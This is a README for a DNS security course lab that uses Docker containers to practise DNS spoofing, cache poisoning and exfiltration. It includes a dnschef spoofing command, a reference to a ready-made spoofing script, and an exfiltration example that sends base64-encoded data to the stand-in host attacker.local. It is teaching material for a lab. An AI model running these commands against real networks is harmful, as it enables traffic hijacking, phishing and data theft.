# 🌐 Pertemuan 7: DNS Security Lab

Lab environment untuk praktik DNS cache poisoning, DNS spoofing, DNS exfiltration, dan multi-server DNS attacks.

---

## 🚀 Quick Start

### Prerequisites
- Docker dan Docker Compose terinstall
- Repository di-clone dari GitHub
- 4GB RAM available
- ~2GB disk space

### Clone Repository
```bash
git clone https://github.com/Muhammad-Ikhwan-Fathulloh/Network-Security-Course-Bank.git
cd Network-Security-Course-Bank
```

### Jalankan Lab
```bash
# Go to Labs folder
cd Labs

# Start Pertemuan 7 lab
docker-compose -f docker-compose-p7.yml up -d

# Verifikasi (should show 6 containers)
docker-compose -f docker-compose-p7.yml ps

# Access attacker container
docker-compose -f docker-compose-p7.yml exec attacker-dns bash
```

### Cleanup
```bash
docker-compose -f docker-compose-p7.yml down
```

---

## 📋 Lab Structure

```
Labs/
├── docker-compose-p7.yml
├── README.md
└── QUICK_REFERENCE.md

Pertemuan7/
├── README.md (this file)
├── INDEX.md
├── scripts/dns_spoof.py    # Ready-to-use script
├── captures/
└── configs/
```

---

## 🐳 Container Services

| Container | IP | Port | Role |
|-----------|----|----|------|
| attacker-dns | 192.168.70.2 | - | dnschef, Scapy |
| dns-resolver | 192.168.70.3 | 53 | BIND9 recursive |
| dns-auth | 192.168.70.4 | 5355 | BIND9 authoritative |
| web-target | 192.168.70.5 | 8081 | Phishing target |
| client-dns | 192.168.70.6 | - | Testing client |
| monitor-dns | 192.168.70.7 | - | tcpdump analysis |

---

## 📖 Lab Workflow

### Multi-Terminal Setup

**Terminal 1: Monitor DNS Queries**
```bash
docker-compose -f docker-compose-p7.yml exec monitor-dns bash
tcpdump -i eth0 -n port 53 -A
```

**Terminal 2: Client Queries**
```bash
docker-compose -f docker-compose-p7.yml exec client-dns bash
apt-get update && apt-get install -y dnsutils
dig @192.168.70.3 google.com
```

**Terminal 3: DNS Spoofing**
```bash
docker-compose -f docker-compose-p7.yml exec attacker-dns bash

# Install dnschef and Python tools
apt-get update && apt-get install -y dnschef python3-scapy

# Spoof DNS
python3 ../Pertemuan7/scripts/dns_spoof.py 192.168.70.2 example.com
```

---

## 🔧 Pre-made Scripts

**DNS Spoofing (Ready to use):**
```bash
python3 Pertemuan7/scripts/dns_spoof.py <fake_ip> [domains] [interface]

# Example:
python3 Pertemuan7/scripts/dns_spoof.py 192.168.70.2 example.com
```

---

## 🔧 DNS Attacks

### DNS Spoofing with dnschef
```bash
dnschef --fakeip 192.168.70.2 \
        --fakedomains example.com \
        --interface 192.168.70.2 \
        --nameserver 192.168.70.3
```

### DNS Exfiltration
```bash
# Client: send data via DNS
DATA=$(echo "secret-data" | base64)
nslookup $DATA.attacker.local 192.168.70.3

# Attacker: capture with tcpdump
tcpdump -i eth0 -n port 53 -A | grep attacker.local
```

---

## 📊 DNS Query Types

| Type | Example |
|------|---------|
| A | dig example.com A |
| AAAA | dig example.com AAAA |
| MX | dig example.com MX |
| NS | dig example.com NS |
| TXT | dig example.com TXT |
| AXFR | dig example.com AXFR (zone transfer) |

---

## 📞 Documentation

- **Theory & Hands-on:** `Pertemuan7.md`
- **Lab Overview:** `Pertemuan7/INDEX.md`
- **Main Guide:** `Labs/README.md`
- **Quick Reference:** `Labs/QUICK_REFERENCE.md`

---

## 🎓 Learning Outcomes

- ✅ DNS resolution process (full flow)
- ✅ DNS record types and queries
- ✅ DNS cache and TTL behavior
- ✅ DNS spoofing techniques
- ✅ Cache poisoning attacks
- ✅ DNS exfiltration for data theft
- ✅ Zone transfer vulnerabilities
- ✅ DNSSEC basics
- ✅ Real-time DNS monitoring

---

## 📚 Repository
GitHub: https://github.com/Muhammad-Ikhwan-Fathulloh/Network-Security-Course-Bank

---

**Next:** Baca `Pertemuan7.md` untuk teori lengkap dan detailed hands-on guide.
